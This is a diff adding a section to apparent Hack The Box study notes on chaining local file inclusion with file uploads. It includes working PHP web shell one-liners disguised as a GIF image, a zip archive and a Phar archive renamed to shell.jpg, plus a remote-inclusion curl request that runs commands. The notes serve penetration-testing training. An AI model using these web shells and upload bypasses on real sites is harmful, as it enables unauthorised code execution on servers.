@@ -37,6 +37,12 @@
         - [HTTP](#http)
         - [FTP](#ftp)
         - [SMB](#smb)
+    - [LFI and File Uploads](#lfi-and-file-uploads)
+      - [Image Upload](#image-upload)
+        - [Crafting Malicious Image](#crafting-malicious-image)
+        - [Uploaded File Path](#uploaded-file-path)
+      - [Zip Upload](#zip-upload)
+      - [Phar Uploads](#phar-uploads)
 
 ---
 
@@ -554,7 +560,7 @@ As you can see, this worked very similar to your HTTP attack, and the command wa
 ```bash
 d41y@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
 ...SNIP...
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)File Uploads
 ```
 
 ##### SMB
@@ -580,3 +586,93 @@ Now, you can include your script by using a UNC path (```\\<OUR_IP>\share\shell.
 ![lfi 16](../../../../images/lfi16.png)
 
 As you can see, this attack works in including your remote script, and you do not need any non-default settings to be enabled. However, you must note that this technique is more likely to work if you were on the same network, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows Server configurations.
+
+### LFI and [File Uploads](../server_side/file_upload_attacks.md)
+
+The following are the functions that allow executing code with file inclusion:
+
+| Function | Read Content | Execute | Remote URL |
+| -------- | ------------ | ------- | ---------- |
+| **PHP** |||
+| ```include()``` / ```include_once()``` | YES | YES | YES |
+| ```require()``` / ```require_once()``` | YES | YES | NO |
+| **NodeJS** |||
+| ```res.render()``` | YES | YES | NO |
+| **Java** |||
+| ```import``` | YES | YES | YES |
+| **.NET** |||
+| ```include``` | YES | YES | YES |
+
+#### Image Upload
+
+... is very common in most modern web apps, as uploading images is widely regarded as safe if the upload function is securely coded.
+
+##### Crafting Malicious Image
+
+The first step is to create a malicious image containing a PHP web shell code that still looks and works as an image. So, you will use an allowed image extension in your file (```shell.gif```), and should also include the image magic bytes at the beginning of the file content, just in case the upload form checks for both the extension and content type as well.
+
+```bash
+d41y@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+```
+
+This file on its own is completely harmless and would not affect normal web apps in the slightest. However, if you combine it with an LFI vuln, then you may be able to reach RCE.
+
+> [!NOTE]
+> You are using a GIF image in this case since its magic bytes are easily typed, as they are ASCII chars, while other extensions have magic bytes that you would need to URL encode.
+
+Now, you need to upload your malicious image file.
+
+![lfi 17](../../../../images/lfi17.png)
+
+##### Uploaded File Path
+
+Once you've uploaded the file, all you need to do is include it through the LFI vuln. To do that, you need to know the path to your uploaded file. In most cases, especially with images, you would get access to your uploaded file and can get its path from its URL. In your case, if you inspect the source code after uploading the image, you can get its URL:
+
+```
+<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
+```
+
+Otherwise, you would need to fuzz for directories.
+
+With the uploaded file path at hand, all you need to do is to include the uploaded file in the LFI vulnerable function, and the PHP code should get executed.
+
+![lfi 18](../../../../images/lfi18.png)
+
+As you can see, you included your file and successfully executed the ```id```  command.
+
+#### Zip Upload
+
+You can utilize zip wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work. To do so, you can start by creating a PHP web shell script and zipping it into a zip archive.
+
+```bash
+d41y@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+```
+
+Once you uploaded the ```shell.jpg``` archive, you can include it with the zip wrapper as ```zip://shell.jpg``` (_URL encoded_), and then refer to any files within it with ```#shell.php```. Finally, you can execute commands:
+
+
+![lfi 19](../../../../images/lfi19.png)
+
+#### Phar Uploads
+
+Finally, you can use the ```phar://``` wrapper to achieve a similar result. To do so, you will first write the following PHP script into a ```shell.php``` file:
+
+```php
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+$phar->stopBuffering();
+```
+
+This script can be compiled into a phar file that when called would write a web shell to a ```shell.txt``` sub-file, which you can interact with. You can compile it into a phar file and rename it to ```shell.jpg```.
+
+```bash
+d41y@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+```
+
+Now, you would have a phar file called ```shell.jpg```. Once you upload it to the web app, you can simply call it with ```phar://``` and provide its URL path, and then specify the phar sub-file with ```/shell.txt``` (_URL encoded_) to get the output of the command you specify.
+
+![lfi 20](../../../../images/lfi20.png)
